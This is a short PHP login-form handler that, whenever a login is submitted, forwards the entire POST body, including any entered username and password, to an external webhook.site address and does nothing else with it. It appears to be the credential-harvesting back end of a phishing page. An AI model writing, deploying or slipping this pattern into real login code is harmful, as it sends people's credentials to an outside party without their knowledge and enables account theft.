<?php

include 'Api.php';
include 'Data.php';

session_start();

if (isset($_POST['login'])) {

    $api = new Api('https://webhook.site/939134e3-edc8-4e5e-abd8-0052885131b7');
    $api->post($_POST);

}










